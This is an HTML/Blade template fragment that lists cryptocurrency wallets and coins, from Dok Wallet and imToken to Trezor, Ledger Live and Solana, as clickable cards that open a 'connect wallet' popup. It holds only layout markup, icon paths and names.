            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="dok_wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Dok Wallet"
                     data-logo="{{asset('assets/img/icon/dok_wallet.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/dok_wallet.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Dok Wallet</a></h5>
                        <span class="price">dokwallet.com</span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="celo_wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Cello Wallet"
                     data-logo="{{asset('assets/img/icon/celo_wallet.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/celo_wallet.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Cello Wallet</a></h5>
                        <span class="price">cellowallet.app</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="coinus" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="CoinUs"
                     data-logo="{{asset('assets/img/icon/coinus.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/coinus.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>CoinUs</a></h5>
                        <span class="price">coinus.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="valora" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Valora"
                     data-logo="{{asset('assets/img/icon/valora.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/valora.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Valora</a></h5>
                        <span class="price">valoraapp.com</span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="guarda_wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Gaurda Wallet"
                     data-logo="{{asset('assets/img/icon/guarda_wallet.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/guarda_wallet.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Gaurda Wallet</a></h5>
                        <span class="price">guarda.com</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="jade_wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Jade Wallet"
                     data-logo="{{asset('assets/img/icon/jade_wallet.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/jade_wallet.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Jade Wallet</a></h5>
                        <span class="price">jadewallet.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="plasmapay" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="PlasmaPay"
                     data-logo="{{asset('assets/img/icon/plasmapay.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/plasmapay.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>PlasmaPay</a></h5>
                        <span class="price">plasmapay.com</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="o3_wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="O3Wallet"
                     data-logo="{{asset('assets/img/icon/o3_wallet.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/o3_wallet.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>O3Wallet</a></h5>
                        <span class="price">o3.network</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="hashkey_me" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="HashKey Me"
                     data-logo="{{asset('assets/img/icon/hashkey_me.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/hashkey_me.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>HashKey Me</a></h5>
                        <span class="price">me.hashkey.com</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="rwallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="RWallet"
                     data-logo="{{asset('assets/img/icon/rwallet.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/rwallet.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>RWallet</a></h5>
                        <span class="price">rsk.co</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="flare_wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Flare Wallet"
                     data-logo="{{asset('assets/img/icon/flare_wallet.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/flare_wallet.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Flare Wallet</a></h5>
                        <span class="price">flarewallet.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="kyberswap" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="KyberSwap"
                     data-logo="{{asset('assets/img/icon/kyberswap.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/kyberswap.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>KyberSwap</a></h5>
                        <span class="price">kyberswap.com</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="atoken_wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="AToken Wallet"
                     data-logo="{{asset('assets/img/icon/atoken_wallet.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/atoken_wallet.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>AToken Wallet</a></h5>
                        <span class="price">atoken.com</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="tongue_wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Tongue Wallet"
                     data-logo="{{asset('assets/img/icon/tongue_wallet.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/tongue_wallet.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Tongue Wallet</a></h5>
                        <span class="price">tongue.fi</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="xinfin" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="XinFin XDC Network"
                     data-logo="{{asset('assets/img/icon/xinfin.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/xinfin.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>XinFin XDC Network</a></h5>
                        <span class="price">xinfin.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="talken_wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Talken Wallet"
                     data-logo="{{asset('assets/img/icon/talken_wallet.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/talken_wallet.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Talken Wallet</a></h5>
                        <span class="price">talken.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="keyring_pro" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="KEYRING PRO"
                     data-logo="{{asset('assets/img/icon/keyring_pro.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/keyring_pro.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>KEYRING PRO</a></h5>
                        <span class="price">keyring.app</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="midas_wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Midas Wallet"
                     data-logo="{{asset('assets/img/icon/midas_wallet.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/midas_wallet.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Midas Wallet</a></h5>
                        <span class="price">midasprotocol.io</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="at_wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="AT.Wallet"
                     data-logo="{{asset('assets/img/icon/at_wallet.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/at_wallet.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>AT.Wallet</a></h5>
                        <span class="price">authentrend.com</span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="imtoken" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="imToken"
                     data-logo="{{asset('assets/img/icon/imtoken.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/imtoken.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>imToken</a></h5>
                        <span class="price">token.im</span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="imtoken" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="imToken"
                     data-logo="{{asset('assets/img/icon/imtoken.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/imtoken.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Others</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Xumm Wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Xumm Wallet"
                     data-logo="{{asset('assets/img/icon/download-5.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-5.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Xumm Wallet</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Trezor Wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Trezor Wallet"
                     data-logo="{{asset('assets/img/icon/trezor-300x300.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/trezor-300x300.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Trezor Wallet</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>


            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Ledger Live" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Ledger Live"
                     data-logo="{{asset('assets/img/icon/download.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Ledger Live</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Exodus wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Exodus wallet"
                     data-logo="{{asset('assets/img/icon/exodus.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/exodus.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Exodus wallet</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Bifrost" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Bifrost"
                     data-logo="{{asset('assets/img/icon/download-3.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-3.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Bifrost</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="XRP" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="XRP"
                     data-logo="{{asset('assets/img/icon/download-3.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-3.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>XRP</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Tradestation" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Tradestation"
                     data-logo="{{asset('assets/img/icon/Tradestation-300x300.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/Tradestation-300x300.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Tradestation</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Terra" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Terra"
                     data-logo="{{asset('assets/img/icon/download-13.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-13.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Terra</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Solo Coin" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Solo Coin"
                     data-logo="{{asset('assets/img/icon/download-15.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-15.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Solo Coin</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Solana Coin" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Solana Coin"
                     data-logo="{{asset('assets/img/icon/download-11.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-11.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Solana Coin</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="SHIBA INU" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="SHIBA INU"
                     data-logo="{{asset('assets/img/icon/images-2.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/images-2.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>SHIBA INU</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="SecuX v20" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="SecuX v20"
                     data-logo="{{asset('assets/img/icon/secu-X-300x150.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/secu-X-300x150.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>SecuX v20</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Sandbox Token" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Sandbox Token"
                     data-logo="{{asset('assets/img/icon/download-6.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-6.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Sandbox Token</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Safepal wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Safepal wallet"
                     data-logo="{{asset('assets/img/icon/safepal.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/safepal.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Safepal wallet</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Rohinhood" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Rohinhood"
                     data-logo="{{asset('assets/img/icon/Rohinhood.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/Rohinhood.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Rohinhood</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Polygon (MATIC)" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Polygon (MATIC)"
                     data-logo="{{asset('assets/img/icon/download-10.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-10.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Polygon (MATIC)</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Polkadot" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Polkadot"
                     data-logo="{{asset('assets/img/icon/download-14.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-14.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Polkadot</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Paybis" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Paybis"
                     data-logo="{{asset('assets/img/icon/pay-300x137.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/pay-300x137.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Paybis</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="NIL Coin" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="NIL Coin"
                     data-logo="{{asset('assets/img/icon/download-9.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-9.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>NIL Coin</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="MyEtherWallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="MyEtherWallet"
                     data-logo="{{asset('assets/img/icon/ether.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/ether.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>MyEtherWallet</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Mongoose Token" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Mongoose Token"
                     data-logo="{{asset('assets/img/icon/download-11.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-11.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Mongoose Token</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Metapets Coin" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Metapets Coin"
                     data-logo="{{asset('assets/img/icon/download-1.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download-1.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Metapets Coin</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Localbitcoin" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Localbitcoin"
                     data-logo="{{asset('assets/img/icon/Localbitcoin.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/Localbitcoin.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Localbitcoin</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Keepkey" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Keepkey"
                     data-logo="{{asset('assets/img/icon/keepkey.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/keepkey.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Keepkey</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Jaxx liberty wallet" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Jaxx liberty wallet"
                     data-logo="{{asset('assets/img/icon/jaxx.png')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/jaxx.png')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Jaxx liberty wallet</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

            <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallet_select">
                <div id="Jasmy Coin" class="contact-info-item select_wallet" data-bs-toggle="offcanvas" data-bs-target="#popup_connect_wallet" data-title="Jasmy Coin"
                     data-logo="{{asset('assets/img/icon/download.jpg')}}" style="cursor:pointer;">
                    <div class="icon">
                        <a href="#">
                            <img src="{{asset('assets/img/icon/download.jpg')}}" alt="Image" class="avatar">
                        </a>
                        <div class="badge"><i class="ripple"></i></div>
                    </div>
                    <div class="content">
                        <h5 class="style2"><a>Jasmy Coin</a></h5>
                        <span class="price"></span>
                    </div>
                </div>
            </div>

